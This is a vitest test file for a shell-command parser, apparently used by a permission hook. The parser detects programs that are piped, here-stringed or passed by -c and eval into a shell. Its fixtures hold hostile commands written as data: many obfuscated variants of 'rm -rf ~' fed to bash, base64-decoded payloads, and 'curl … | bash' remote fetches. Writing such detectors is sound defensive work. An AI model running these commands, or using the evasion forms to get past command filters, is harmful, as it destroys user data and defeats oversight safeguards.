import { describe, expect, it } from 'vitest';
import { parseShellArgs } from '../../src/actions/shell-args.js';
import { decodePrograms, shellInput, type ShellInput } from '../../src/actions/shell-input.js';
import { cpuNow } from '../cpu-time.js';

/** What a reading found, without where each text runs and on which machine. */
const plain = ({ texts, files, opaque }: ShellInput) => ({ texts, files, opaque });

describe('parseShellArgs: which file a shell is told to run', () => {
  it.each<[string, readonly string[], readonly string[]]>([
    ['a script', ['x.sh'], ['x.sh']],
    ['options before it', ['-x', 'x.sh'], ['x.sh']],
    ['a value option', ['-o', 'pipefail', 'x.sh'], ['x.sh']],
    ['a cluster ending in o', ['-euo', 'pipefail', 'x.sh'], ['x.sh']],
    ['a redirect of stderr before it', ['2>/dev/null', 'x.sh'], ['x.sh']],
    ['a redirect of stdout before it', ['>/dev/null', 'x.sh'], ['x.sh']],
    ['a redirect with its target apart', ['>', '/dev/null', 'x.sh'], ['x.sh']],
    ['a merge of the streams', ['2>&1', 'x.sh'], ['x.sh']],
    ['both streams to a file', ['&>/dev/null', 'x.sh'], ['x.sh']],
    ['a background ampersand after it', ['x.sh', '&'], ['x.sh']],
    ['arguments after it', ['x.sh', '-c', 'a'], ['x.sh']],
    ['after the end of options', ['--', 'x.sh'], ['x.sh']],
    ['a file the script is given on input', ['x.sh', '<', 'data'], ['x.sh']],
    ['a process substitution after it, which is its argument', ['x.sh', '<(cat a)'], ['x.sh']],
  ])('%s', (_name, args, files) => {
    const parsed = parseShellArgs(args);
    expect(parsed.files).toEqual(files);
    expect(parsed.commands).toEqual([]);
    expect(parsed.readsStdin).toBe(false);
    expect(parsed.inline).toBe(false);
  });

  it.each<[string, readonly string[], readonly string[]]>([
    ['no arguments', [], []],
    ['a dash', ['-'], []],
    ['a login flag', ['-l'], []],
    [
      "-s with arguments, which are the program's and may be files it runs",
      ['-s', 'a', 'b'],
      ['a', 'b'],
    ],
    ['-s after the end of options', ['-s', '--', 'a'], ['a']],
    ['stdin named', ['/dev/stdin'], []],
    ['stdin named by a longer path', ['/dev/./stdin'], []],
    ['stdin named by its descriptor', ['/dev/fd/0'], []],
    ['stdin named, with arguments after it', ['/dev/stdin', 'a'], []],
    ['a here-string', ['<<<', 'text'], []],
    ['a glued here-string', ['<<<text'], []],
    ['output redirects only', ['>/dev/null', '2>&1', '&'], []],
  ])('reads a program from standard input: %s', (_name, args, files) => {
    const parsed = parseShellArgs(args);
    expect(parsed.readsStdin).toBe(true);
    expect(parsed.files).toEqual(files);
    expect(parsed.commands).toEqual([]);
  });

  it.each<[string, readonly string[], string]>([
    ['a redirect', ['<', 'x.sh'], 'x.sh'],
    ['a glued redirect', ['<x.sh'], 'x.sh'],
    ['a redirect after the end of options', ['--', '<', 'x.sh'], 'x.sh'],
    ['a redirect after an output one', ['>/dev/null', '<', 'x.sh'], 'x.sh'],
    ['stdin named, and redirected', ['/dev/stdin', '<x.sh'], 'x.sh'],
    ['the last of two redirects', ['<', 'a.sh', '<', 'b.sh'], 'b.sh'],
    ['-s and a redirect', ['-s', 'a', '<', 'x.sh'], 'x.sh'],
  ])('takes the program from a file its input is redirected from: %s', (_n, args, file) => {
    const parsed = parseShellArgs(args);
    expect(parsed.stdin).toEqual({ kind: 'file', value: file, dynamic: false });
    expect(parsed.readsStdin).toBe(true);
  });

  it('is not given the program by a redirect of another descriptor', () => {
    expect(parseShellArgs(['3<', 'x.sh']).stdin).toBeNull();
    expect(parseShellArgs(['<&0']).stdin).toBeNull();
    expect(parseShellArgs(['<&-']).stdin).toBeNull();
  });

  it('is given a program from a stream it cannot read by a duplicated descriptor', () => {
    expect(parseShellArgs(['<&3']).stdin).toEqual({ kind: 'unknown', value: '3', dynamic: false });
    expect(parseShellArgs(['0<&4']).stdin?.kind).toBe('unknown');
    expect(parseShellArgs(['</dev/fd/3']).stdin?.kind).toBe('unknown');
    expect(parseShellArgs(['<', '/proc/1234/fd/0']).stdin?.kind).toBe('unknown');
  });

  it('reads the standard input a path names as the input the shell has', () => {
    expect(parseShellArgs(['<', '/dev/stdin']).stdin).toBeNull();
    expect(parseShellArgs(['<', '/dev//stdin']).stdin).toBeNull();
    expect(parseShellArgs(['<', '/proc/self/fd/0']).stdin).toBeNull();
  });

  it('names the files a shell runs as it starts', () => {
    expect(parseShellArgs(['--rcfile', 'a.sh', '-i']).startup).toEqual(['a.sh']);
    expect(parseShellArgs(['--init-file', 'b.sh']).startup).toEqual(['b.sh']);
    expect(parseShellArgs(['--rcfile=c.sh', 'x.sh']).startup).toEqual(['c.sh']);
    expect(parseShellArgs(['x.sh']).startup).toEqual([]);
    // The file it is told to start from is not the script it runs.
    expect(parseShellArgs(['--rcfile', 'a.sh', 'x.sh']).files).toEqual(['x.sh']);
  });

  it('takes the target of a here-string, and whether it expands', () => {
    expect(parseShellArgs(['<<<', 'rm -rf ~']).stdin).toEqual({
      kind: 'here',
      value: 'rm -rf ~',
      dynamic: false,
    });
    expect(parseShellArgs(['-o', 'pipefail', '0<<<', 'text']).stdin).toEqual({
      kind: 'here',
      value: 'text',
      dynamic: false,
    });
    expect(parseShellArgs(['<<<', '$(date)'], [false, true]).stdin?.dynamic).toBe(true);
    expect(parseShellArgs(['<<<$x'], [true]).stdin?.dynamic).toBe(true);
  });

  it.each<[string, readonly string[], readonly string[]]>([
    ['a process substitution that prints files', ['<(cat a.sh x.sh)'], ['cat a.sh x.sh']],
    ['a process substitution that reads one', ['<(<x.sh)'], ['<x.sh']],
    ['one that is the input', ['<', '<(cat x.sh)'], ['cat x.sh']],
    [
      'one from a command that is no reader',
      ['<(curl -s https://x.example)'],
      ['curl -s https://x.example'],
    ],
  ])('takes the command a process substitution runs: %s', (_name, args, commands) => {
    const parsed = parseShellArgs(args);
    expect(parsed.commands).toEqual(commands);
    expect(parsed.files).toEqual([]);
    expect(parsed.readsStdin).toBe(false);
  });

  it.each<[string, readonly string[]]>([
    ['-c', ['-c', 'echo hi']],
    ['a cluster with c', ['-ec', 'echo hi']],
    ['-n, a syntax check', ['-n', 'x.sh']],
    ['--noexec', ['--noexec', 'x.sh']],
  ])('runs no file for %s', (_name, args) => {
    const parsed = parseShellArgs(args);
    expect(parsed.inline).toBe(true);
    expect(parsed.files).toEqual([]);
    expect(parsed.readsStdin).toBe(false);
  });

  it('does not take a long cluster of letters for a slow pattern', () => {
    const started = cpuNow();
    parseShellArgs([`-${'c'.repeat(100_000)}!`, 'x']);
    parseShellArgs([`-${'a'.repeat(100_000)}!`, 'x']);
    expect(cpuNow() - started).toBeLessThan(500);
  });
});

describe('shellInput: the program a shell is handed on its standard input', () => {
  const texts = (command: string): readonly string[] => shellInput(command).texts;
  const trimmed = (command: string): string[] => texts(command).map((t) => t.trim());

  it.each<[string, string]>([
    ["echo 'rm -rf ~' | bash", 'rm -rf ~'],
    ['echo "rm -rf ~" | sh', 'rm -rf ~'],
    ['echo rm -rf ~ | bash', 'rm -rf ~'],
    ["echo -n 'rm -rf ~' | bash", 'rm -rf ~'],
    ["/bin/echo 'rm -rf ~' | bash", 'rm -rf ~'],
    ["command echo 'rm -rf ~' | bash", 'rm -rf ~'],
    ["echo $'rm -rf ~' | bash", 'rm -rf ~'],
    ["echo $'\\x72m -rf ~' | bash", 'rm -rf ~'],
    ["printf '%s\\n' 'rm -rf ~' | bash", 'rm -rf ~'],
    ["printf 'rm -rf ~\\n' | sh", 'rm -rf ~'],
    ["printf 'rm -rf %s\\n' ~ | bash", 'rm -rf ~'],
    ["printf '\\x72m -rf ~' | bash", 'rm -rf ~'],
    ["printf 'rm\\040-rf\\040~' | bash", 'rm -rf ~'],
    ["printf '%b' 'rm\\040-rf\\040~' | bash", 'rm -rf ~'],
    ["echo 'rm -rf ~' | cat | bash", 'rm -rf ~'],
    ["echo 'rm -rf ~' | tee out.txt | bash", 'rm -rf ~'],
    ["(echo 'rm -rf ~') | bash", 'rm -rf ~'],
    ["echo 'rm -rf ~' |\nbash", 'rm -rf ~'],
    ["echo 'rm -rf ~' |& bash", 'rm -rf ~'],
    ["echo 'rm -rf ~' | bash > /dev/null", 'rm -rf ~'],
    ["echo 'rm -rf ~' | bash &", 'rm -rf ~'],
    ["echo 'rm -rf ~' | bash -s -- a b", 'rm -rf ~'],
    ["echo 'rm -rf ~' | bash -euo pipefail", 'rm -rf ~'],
    ["echo 'rm -rf ~' | sudo bash", 'rm -rf ~'],
    ["echo 'rm -rf ~' | /usr/bin/env bash", 'rm -rf ~'],
    ["echo 'rm -rf ~' | busybox sh", 'rm -rf ~'],
    ["echo 'rm -rf ~' | fish", 'rm -rf ~'],
    ["echo 'rm -rf ~' | ash", 'rm -rf ~'],
    ["bash <<< 'rm -rf ~'", 'rm -rf ~'],
    ['sh <<< "rm -rf ~"', 'rm -rf ~'],
    ["bash -o pipefail <<< 'rm -rf ~'", 'rm -rf ~'],
    ["bash 0<<< 'rm -rf ~'", 'rm -rf ~'],
    ['bash <<< "$(echo \'rm -rf ~\')"', 'rm -rf ~'],
    ["source /dev/stdin <<< 'rm -rf ~'", 'rm -rf ~'],
    ["bash <<'EOF'\nrm -rf ~\nEOF", 'rm -rf ~'],
    ["cd /tmp && echo 'rm -rf ~' | bash", 'rm -rf ~'],
  ])('%s', (command, expected) => {
    expect(trimmed(command)).toContain(expected);
    expect(shellInput(command).opaque).toBe(false);
  });

  it('keeps the text of a printf whose format says more than the arguments do', () => {
    expect(trimmed("printf 'cd %s && rm -rf %s\\n' /tmp ~ | bash")).toEqual([
      'cd /tmp && rm -rf ~',
    ]);
  });

  it('reuses a format while arguments are left', () => {
    expect(trimmed("printf '%s\\n' 'echo a' 'rm -rf ~' | bash")).toEqual(['echo a\nrm -rf ~']);
  });

  it.each<[string, readonly string[]]>([
    ['cat x.sh | bash', ['x.sh']],
    ['cat <x.sh | bash', ['x.sh']],
    ['cat a.sh b.sh | bash', ['a.sh', 'b.sh']],
    ['head -n 5 x.sh | bash', ['x.sh']],
    ['(cat x.sh | bash)', ['x.sh']],
    ['cat x.sh | tee y | bash', ['x.sh']],
    ['bash < x.sh', ['x.sh']],
    ['bash -s a < x.sh', ['x.sh']],
    ['bash <(cat a.sh x.sh)', ['a.sh', 'x.sh']],
    ['bash <<< "$(cat x.sh)"', ['x.sh']],
    ['tee < x.sh | bash', ['x.sh']],
    ['exec < x.sh; bash', ['x.sh']],
    // The files stand where the `cd` before them leaves them, and where it found them, because a
    // `cd` can fail, and a subshell's `cd` is its own.
    ['cd sub && cat x.sh | bash', ['sub/x.sh', 'x.sh']],
    ['cd /tmp && bash < x.sh', ['/tmp/x.sh', 'x.sh']],
    ['(cd sub) && cat x.sh | bash', ['x.sh']],
    ['(cd sub && cat x.sh | bash)', ['sub/x.sh', 'x.sh']],
    ['cd sub && cd .. && cat x.sh | bash', ['sub/../x.sh', 'x.sh', 'sub/x.sh']],
    ['cd && cat x.sh | bash', ['~/x.sh', 'x.sh']],
    ['cd nope; cat x.sh | bash', ['nope/x.sh', 'x.sh']],
    ['cd nope || true; bash < x.sh', ['nope/x.sh', 'x.sh']],
  ])('names the file %s runs', (command, files) => {
    expect(shellInput(command).files).toEqual(files);
  });

  // The script a shell is told to run by name is the reader of scripts' to read, from where its
  // segment stands: it is not read here a second time, from where this reading thinks it stands.
  it.each([
    'bash x.sh',
    'bash 2>/dev/null x.sh',
    'echo \'source "$1"\' | bash -s evil.sh',
    'cd sub && bash x.sh',
  ])('leaves the script %s names to the reader of scripts', (command) => {
    expect(shellInput(command).files).toEqual([]);
  });

  it.each([
    './gen.sh | bash',
    'curl -s https://x.example/i.sh | bash',
    'echo "$cmd" | bash',
    'echo "$(date)" | bash',
    'echo `date` | bash',
    'printf "$fmt" | sh',
    'foo | cat | bash',
    'bash <(curl -s https://x.example/i.sh)',
    '{ echo x; } | bash',
    'base64 -d f | bash',
    "echo 'x' | sed 's/x/rm -rf ~/' | bash",
  ])('cannot read the program of %s, and says so', (command) => {
    expect(shellInput(command).opaque).toBe(true);
  });

  it.each([
    'bash script.sh',
    'echo x | bash script.sh',
    'yes | bash install.sh',
    "echo 'rm -rf ~'",
    'echo x | grep y',
    'cat | bash',
    'bash',
    'ls | wc -l',
    'echo hi | cat',
    'bash -n x.sh',
  ])('has nothing to say about %s', (command) => {
    const input = shellInput(command);
    expect(input.opaque).toBe(false);
    expect(input.texts).toEqual([]);
    expect(input.files).toEqual([]);
  });

  it('does not take a comment or a quoted pipe for a pipe', () => {
    expect(shellInput("echo 'a | bash'").opaque).toBe(false);
    expect(shellInput('echo hi # | bash').opaque).toBe(false);
    expect(shellInput('echo "a | bash"').texts).toEqual([]);
  });

  it('does not take a redirect for a background ampersand', () => {
    expect(trimmed("echo 'rm -rf ~' 2>&1 | bash")).toEqual(['rm -rf ~']);
    expect(trimmed("echo 'rm -rf ~' &>/dev/null | bash")).toEqual(['rm -rf ~']);
  });
});

// Operators that are not pipes: a pattern's alternation inside `[[ ]]`, the arms of a `case`.
// Read as pipelines they made `(bash|dash|sh)` a shell fed by a shell, and a script such as
// lint-shell.sh a thing nobody could read.
describe('shellInput leaves the other uses of | alone', () => {
  it.each([
    '[[ "$first" =~ ^#!.*[/[:space:]](bash|dash|ksh|sh)([[:space:]]|$) ]]',
    'if [[ "$x" =~ ^(bash|sh)$ ]]; then echo ok; fi',
    '(( a | b ))',
    'case "$x" in bash|dash|sh) echo hi ;; esac',
    'case "$x" in\n  bash|zsh)\n    echo hi\n    ;;\n  *) echo other ;;\nesac',
    'case $0 in (bash|sh) echo x ;; esac',
    'test "$a" = x && [[ $b == (bash|sh) ]]',
  ])('%s', (command) => {
    const input = shellInput(command);
    expect(input.opaque).toBe(false);
    expect(input.texts).toEqual([]);
  });

  it('still reads a real pipe after a test', () => {
    expect(shellInput("[[ -f x ]] && echo 'rm -rf ~' | bash").texts.join('')).toContain('rm -rf ~');
    expect(shellInput('[[ -f x ]] && foo | bash').opaque).toBe(true);
  });
});

describe('shellInput stays linear on a command built to be slow', () => {
  const SIZE = 128 * 1024;
  const timed = (command: string): number => {
    const started = cpuNow();
    shellInput(command);
    return cpuNow() - started;
  };
  it.each<[string, string]>([
    ['alternations', `bash ${'a|'.repeat(SIZE / 2)}x`],
    ['case-like lists', `${'a|'.repeat(SIZE / 2)}x) bash`],
    ['many case arms', 'a|b) echo; '.repeat(SIZE / 11) + 'bash'],
    ['many tests', '[[ x ]]; '.repeat(SIZE / 9) + 'bash'],
    ['unclosed tests', `${'[[ '.repeat(SIZE / 3)}bash`],
    ['unclosed substitutions', `echo ${'$('.repeat(SIZE / 2)} | bash`],
    ['unclosed backticks', `echo ${'`'.repeat(SIZE)} | bash`],
    ['unclosed quotes', `echo ${"'".repeat(SIZE)} | bash`],
    ['ansi-c quotes', `echo ${"$'".repeat(SIZE / 2)} | bash`],
    ['many heredoc openers', 'cat <<A\n'.repeat(SIZE / 8) + 'bash'],
    ['many here-strings', 'bash <<< x; '.repeat(SIZE / 12)],
    ['pipe runs', `echo x ${'| cat '.repeat(SIZE / 6)}| bash`],
    ['ampersand runs', `bash ${'& '.repeat(SIZE / 2)}`],
    ['redirect runs', `bash ${'2>&1 '.repeat(SIZE / 5)}x.sh`],
    ['parentheses', `${'('.repeat(SIZE)}echo x | bash`],
    ['printf formats', `printf '${'%s'.repeat(SIZE / 2)}' x | bash`],
    ['escapes', `printf '${'\\x41'.repeat(SIZE / 4)}' | bash`],
    // The wrappers that split or join their arguments again each copy the words after them.
    ['an eval chain', `echo x | ${'eval '.repeat(SIZE / 5)}bash`],
    ['an env -S chain', `echo x | ${"env -S 'env' ".repeat(SIZE / 13)}bash`],
    ['a sudo chain', `echo x | ${'sudo '.repeat(SIZE / 5)}bash`],
    ['redirects before the command', `echo x | ${'2>&1 '.repeat(SIZE / 5)}bash`],
    ['subshells opened', `${'( '.repeat(SIZE / 2)}cat x | bash`],
    ['subshells closed', 'cat x | bash ) '.repeat(SIZE / 14)],
    ['directory changes', `${'cd a; '.repeat(SIZE / 6)}cat x | bash`],
    ['echo options', `echo ${'-n '.repeat(SIZE / 3)}x | bash`],
  ])('%s', (_name, command) => {
    expect(timed(command)).toBeLessThan(2500);
  });
});

// Timing and memory shapes found slow. A hook that does not answer is an allow, so each of these
// is a way to turn a command into one: the cost has to stay linear in the command and bounded in
// what it builds, whatever the nesting.
describe('shellInput stays bounded on the shapes that were found slow', () => {
  const time = (command: string): number => {
    const started = cpuNow();
    shellInput(command);
    return cpuNow() - started;
  };

  it('a here-string whose substitution is mostly white space', () => {
    expect(time(`bash <<< "$(${' '.repeat(4000)}x`)).toBeLessThan(1500);
    expect(time(`bash <<< "$(${' '.repeat(60_000)}x`)).toBeLessThan(1500);
  });

  it('a long run of white space and then many c and e at a command start', () => {
    expect(time(`${' '.repeat(96_000)}${'e'.repeat(96_000)} bash`)).toBeLessThan(2500);
    expect(time(`${' '.repeat(96_000)}${'c'.repeat(96_000)} bash`)).toBeLessThan(2500);
  });

  it('a long option word under xargs', () => {
    expect(time(`echo x | xargs sh -${'c'.repeat(100_000)}! -c {}`)).toBeLessThan(2500);
  });

  it('a printf whose format repeats, builds nothing past a bound', () => {
    const args = ' x'.repeat(1100);
    const input = shellInput(`printf '${'a'.repeat(20_000)}%s'${args} | bash`);
    expect(input.texts.join('').length).toBeLessThan(2_000_000);
    // Past the bound nothing is built, and a program nobody read is asked about.
    expect(input.texts).toEqual([]);
    expect(input.opaque).toBe(true);
  });
});

// The contract: where the shape of a command cannot be proven plain, the answer is a question
// (`opaque`) and not a guess. `decoded` is the strict reading, the program found
// and nothing left in doubt; `caught` also accepts the question.
describe('shellInput reads the command word however it is written', () => {
  const found = (command: string) => shellInput(command);
  const decoded = (command: string): boolean =>
    !found(command).opaque && found(command).texts.some((t) => t.includes('rm -rf ~'));
  const caught = (command: string): boolean =>
    found(command).opaque || found(command).texts.some((t) => t.includes('rm -rf ~'));

  it.each([
    `echo 'rm -rf ~' | "bash"`,
    `echo 'rm -rf ~' | 'sh'`,
    `echo 'rm -rf ~' | ba'sh'`,
    `echo 'rm -rf ~' | \\bash`,
    `echo 'rm -rf ~' | eval bash`,
    `echo 'rm -rf ~' | eval 'bash -s'`,
    `echo 'rm -rf ~' | exec -a x bash`,
    `echo 'rm -rf ~' | env -S 'bash -s'`,
    `echo 'rm -rf ~' | env -i FOO=1 bash`,
    `echo 'rm -rf ~' | sudo --user root bash`,
    `echo 'rm -rf ~' | sudo -u root bash`,
    `echo 'rm -rf ~' | nohup bash`,
    `echo 'rm -rf ~' | timeout 5 bash`,
    `echo 'rm -rf ~' | time bash`,
    `echo 'rm -rf ~' | sh -c bash`,
    `sh -c bash <<< 'rm -rf ~'`,
    `sh -c 'bash -s' <<'EOF'\nrm -rf ~\nEOF`,
    `echo 'rm -rf ~' | 2>/dev/null bash`,
    `sudo echo 'rm -rf ~' | bash`,
    `command echo 'rm -rf ~' | bash`,
  ])('%s', (command) => {
    expect(decoded(command)).toBe(true);
  });

  it.each([
    'echo x | $SHELL',
    'echo x | "$SHELL"',
    'echo x | ${SH}',
    'echo x | $(which bash)',
    "$SHELL <<< 'rm -rf ~'",
    '"$0" <<< \'rm -rf ~\'',
    'echo x | { :; bash; }',
    'echo x | while read l; do bash; done',
    'echo x | xargs echo | bash',
    'echo x | xargs -I{} sh -c {}',
    "echo 'rm -rf ~' | sed s/x/y/ | bash",
    '{ echo x; } | cat | bash',
  ])('cannot read the program of %s, and says so', (command) => {
    expect(found(command).opaque).toBe(true);
  });

  it('does not take the arguments of xargs for a program', () => {
    expect(plain(found("echo 'rm -rf ~' | xargs bash"))).toEqual({
      texts: [],
      files: [],
      opaque: false,
    });
    expect(found("echo 'rm -rf ~' | xargs -n1 sh -c 'echo $0'").opaque).toBe(false);
  });

  it.each([
    "echo 'rm -rf ~' | # a comment\nbash",
    "echo 'rm -rf ~' |\n# one\n# two\nbash",
    "x=$(echo a # it's\n); echo 'rm -rf ~' | bash",
    "echo `echo \\`date\\``; echo 'rm -rf ~' | bash",
    "cat <<< [[ x; echo 'rm -rf ~' | bash; echo x ]]",
    "echo ${x:-<<E}; echo 'rm -rf ~' | bash",
    "cat <<\\EOF\nit's\nEOF\necho 'rm -rf ~' | bash",
    "x=$[1<<2]\necho 'rm -rf ~' | bash\n2",
    "echo $((1 << 2)); echo 'rm -rf ~' | bash",
    "case $x in a) echo 1;; esac; echo 'rm -rf ~' | bash",
    "if [[ -f x ]]; then echo 'rm -rf ~' | bash; fi",
    "echo 'rm -rf ~' >| out.txt; echo 'rm -rf ~' | bash",
    "git commit -m \"$(cat <<'EOF'\nfix: don't (really) break )\nEOF\n)\" && echo 'rm -rf ~' | bash",
  ])('does not lose a pipe behind %s', (command) => {
    expect(decoded(command)).toBe(true);
  });

  it.each(["[[ x ]] && echo 'rm -rf ~' | bash", "(( 1 | 2 )); echo 'rm -rf ~' | bash"])(
    'still reads a pipe after a test or an arithmetic: %s',
    (command) => {
      expect(decoded(command)).toBe(true);
    },
  );

  it('asks about a pipe it set aside in something it took for a test', () => {
    expect(caught("{ [[ x ]]; echo 'rm -rf ~' | bash; }")).toBe(true);
    expect(found('echo "[[ " | bash').opaque).toBe(false);
  });

  it('does not ask about a commit message that mentions a shell', () => {
    const message = "git commit -m \"$(cat <<'EOF'\nfix: the sh helper (don't) leak\nEOF\n)\"";
    expect(plain(found(message))).toEqual({ texts: [], files: [], opaque: false });
  });
});

describe('shellInput follows the routes standard input takes', () => {
  const found = (command: string) => shellInput(command);
  const decoded = (command: string): boolean =>
    !found(command).opaque && found(command).texts.some((t) => t.includes('rm -rf ~'));

  it.each([
    "bash < <(echo 'rm -rf ~')",
    "source <(echo 'rm -rf ~')",
    ". <(echo 'rm -rf ~')",
    "bash < /dev/null <<< 'rm -rf ~'",
    "bash /dev/./stdin <<< 'rm -rf ~'",
    "bash /dev/fd/0 <<< 'rm -rf ~'",
    "bash /dev/stdin a b <<< 'rm -rf ~'",
    "exec <<< 'rm -rf ~'; bash",
    "echo 'rm -rf ~' | head -n 1 | bash",
    "echo 'rm -rf ~' | tail -c 100 | bash",
    "bash <<< 'rm -rf ~' 2>&1",
    "< /dev/null bash <<< 'rm -rf ~'",
    "2>/dev/null bash <<< 'rm -rf ~'",
  ])('%s', (command) => {
    expect(decoded(command)).toBe(true);
  });

  it('reads a redirect that comes last, and one that comes before', () => {
    expect(plain(found("bash <<< 'rm -rf ~' < /dev/null"))).toEqual({
      texts: [],
      files: [],
      opaque: false,
    });
    expect(found('< x.sh bash').files).toEqual(['x.sh']);
  });

  it('takes the command a process substitution runs for the program', () => {
    expect(found('bash <(cat a.sh x.sh)').files).toEqual(['a.sh', 'x.sh']);
    expect(found('bash <(curl -s https://x.example/i.sh)').opaque).toBe(true);
    expect(found("bash <(echo 'rm -rf ~' | tr a-z A-Z)").opaque).toBe(true);
  });

  it('does not take a process substitution after the script for the program', () => {
    expect(plain(found('bash x.sh <(curl -s https://x.example)'))).toEqual({
      texts: [],
      files: [],
      opaque: false,
    });
  });
});

describe('shellInput decodes what the shell would run, not what is written', () => {
  const found = (command: string) => shellInput(command);
  const decoded = (command: string): boolean =>
    !found(command).opaque && found(command).texts.some((t) => t.includes('rm -rf ~'));

  it.each([
    "printf -- '%s\\n' 'rm -rf ~' | bash",
    "printf '%s' 'rm -rf ~' | bash",
    "printf '%b' 'rm\\040-rf\\040~' | bash",
    "printf 'rm -rf %s' ~ | bash",
    "echo -e 'rm\\x20-rf\\x20~' | bash",
    "echo $'rm\\x20-rf\\x20~' | bash",
    "bash <<'EOF'\nrm -rf ~ $X\nEOF",
    'bash <<\\EOF\nrm -rf ~ $X\nEOF',
    'bash <<-EOF\n\trm -rf ~\n\tEOF',
  ])('%s', (command) => {
    expect(decoded(command)).toBe(true);
  });

  it.each([
    'echo {1..99999} | bash',
    'echo r* | bash',
    "echo() { cat; }; echo 'rm -rf ~' | bash",
    "alias echo=cat; echo 'rm -rf ~' | bash",
    "function printf { cat; }; printf 'rm -rf ~' | bash",
    'bash <<< "$(echo cm0gLXJmIH4K | base64 -d)"',
    'bash <<EOF\n$tool --flag\nEOF',
    'echo "$cmd" | bash',
    'echo $x rm -rf ~ | bash',
  ])('is not what %s says, and says so', (command) => {
    expect(found(command).opaque).toBe(true);
  });

  it.each<[string, string]>([
    ['echo "rm -rf $X" | bash', 'rm -rf $X'],
    ['echo "rm -rf $(pwd)" | bash', 'rm -rf $(pwd)'],
    ['bash <<EOF\nrm -rf $X\nEOF', 'rm -rf $X\n'],
    ['bash <<EOF\nrm -rf `pwd`\nEOF', 'rm -rf `pwd`\n'],
    ['bash <<EOF\nrm -rf \\$X\nEOF', 'rm -rf $X\n'],
    ['bash <<EOF\necho $HOME\nEOF', 'echo $HOME\n'],
    ['cat <<EOF | sh\necho $PWD\nEOF', 'echo $PWD\n'],
  ])('reads %j as written when only its arguments expand', (command, text) => {
    const input = found(command);
    expect(input.texts).toEqual([text]);
    expect(input.opaque).toBe(false);
  });

  // A brace expansion needs no shell to be read: echo prints the words it makes.
  it.each<[string, string]>([
    ['echo {rm,-rf,~} | bash', 'rm -rf ~'],
    ["echo {rm,-rf,'~'} | bash", 'rm -rf ~'],
    ['echo {1..3} | bash', '1 2 3'],
    ['echo rm -rf {~,/} | bash', 'rm -rf ~ /'],
    ["{bash,-c,'rm -rf ~'}", 'rm -rf ~'],
    ["bash -c {'rm -rf ~',x}", 'rm -rf ~'],
    ['echo "{rm,-rf,~}" | bash', '{rm,-rf,~}'],
  ])('reads the braces of %j as the shell makes them', (command, text) => {
    const input = found(command);
    expect(input.texts).toEqual([text]);
    expect(input.opaque).toBe(false);
  });

  it('does not decode the escapes in the argument of a %s', () => {
    expect(found("printf '%s' 'rm -rf ~\\nls' | bash").texts).toEqual(['rm -rf ~\\nls']);
  });

  it('treats an escape that makes a percent sign as a character, not a conversion', () => {
    expect(found("printf '\\x25s' x | bash").texts).toEqual(['%s']);
  });

  it('keeps the exact text of an unquoted heredoc that expands nothing', () => {
    expect(plain(found('bash <<EOF\nrm -rf ~\nEOF'))).toEqual({
      texts: ['rm -rf ~\n'],
      files: [],
      opaque: false,
    });
  });
});

describe('shellInput bounds what it builds', () => {
  it('stops a printf that would build a huge text, and asks', () => {
    const found = shellInput(
      `printf '${'%s'.repeat(2000)}' ${'x'.repeat(1000)} ${'y '.repeat(1000)}| bash`,
    );
    expect(found.texts.join('').length).toBeLessThan(2_000_000);
  });

  it('spends one budget across the texts it is given', () => {
    const budget = { room: 1000 };
    const big = `echo '${'a'.repeat(900)}' | bash`;
    expect(shellInput(big, budget).texts).toHaveLength(1);
    const second = shellInput(big, budget);
    expect(second.texts).toEqual([]);
    expect(second.opaque).toBe(true);
  });

  it('reads a command that nests programs a few levels deep, and says where it stopped', () => {
    const one = "echo 'rm -rf ~' | bash";
    const wrap = (inner: string): string => `echo ${JSON.stringify(inner)} | bash`;
    expect(decodePrograms(wrap(wrap(one))).opaque).toBe(false);
    expect(decodePrograms(wrap(wrap(wrap(wrap(wrap(one)))))).opaque).toBe(true);
  });
});

describe('shellInput reads the commands a shell runs from where they stand', () => {
  const found = (command: string) => shellInput(command);
  const decoded = (command: string): boolean =>
    !found(command).opaque && found(command).texts.some((t) => t.includes('rm -rf ~'));

  it.each([
    // the head of a function definition stands before its body
    "f() { bash <<< 'rm -rf ~'; }; f",
    "function f { bash <<< 'rm -rf ~'; }; f",
    "function f() { bash <<< 'rm -rf ~'; }; f",
    "f() ( bash <<< 'rm -rf ~' ); f",
    "g() { f() { bash <<< 'rm -rf ~'; }; f; }; g",
    // a keyword may be followed by a group
    "time { bash <<< 'rm -rf ~'; }",
    "time ( bash <<< 'rm -rf ~' )",
    "coproc bash <<< 'rm -rf ~'",
    "noglob bash <<< 'rm -rf ~'",
    // a case after a keyword, and an arm that opens with a subshell
    "for i in 1; do case x in x) bash <<< 'rm -rf ~';; esac; done",
    "( case x in x) bash <<< 'rm -rf ~';; esac )",
    "while case x in\n  (x) bash <<< 'rm -rf ~';;\nesac; do break; done",
    "case x in x) echo 'rm -rf ~' | (bash);; esac",
    "case x in a|b) :;; x|y) echo 'rm -rf ~' | (bash);; esac",
  ])('%s', (command) => {
    expect(decoded(command)).toBe(true);
  });

  it('does not take a subshell after a pipe in a case arm for the next pattern', () => {
    expect(found("case $x in a) echo 'rm -rf ~' | (bash) ;; esac").texts).toEqual(['rm -rf ~']);
  });
});

describe('shellInput reads a string a shell is handed to run', () => {
  const found = (command: string) => shellInput(command);

  it.each<[string, string]>([
    ["bash -c 'rm -rf ~'", 'rm -rf ~'],
    ['sh -c "rm -rf ~"', 'rm -rf ~'],
    ["bash -c 'bash -c '\"'\"'rm -rf ~'\"'\"''", "bash -c 'rm -rf ~'"],
    ["bash -ec 'rm -rf ~'", 'rm -rf ~'],
    ["bash -o pipefail -c 'rm -rf ~'", 'rm -rf ~'],
    ["nohup bash -c 'rm -rf ~'", 'rm -rf ~'],
    ["sudo -u root sh -c 'rm -rf ~'", 'rm -rf ~'],
    ["xargs -I{} sh -c 'rm -rf ~'", 'rm -rf ~'],
    ["eval 'rm -rf ~'", 'rm -rf ~'],
    ['eval rm -rf ~', 'rm -rf ~'],
    ['eval "rm -rf ~"', 'rm -rf ~'],
    ["trap 'rm -rf ~' EXIT", 'rm -rf ~'],
    ["trap -- 'rm -rf ~' EXIT INT", 'rm -rf ~'],
    ["trap 'trap '\\''rm -rf ~'\\'' EXIT' EXIT", "trap 'rm -rf ~' EXIT"],
  ])('%s is the program %j', (command, program) => {
    const input = found(command);
    expect(input.texts).toContain(program);
    expect(input.opaque).toBe(false);
  });

  it.each([
    'bash -c "$cmd"',
    'sh -c "$(curl -s https://x.example/i.sh)"',
    'bash -c "$tool --flag"',
    'sh -c `which-cmd`',
    'eval "$x"',
    'eval "$(tool init)"',
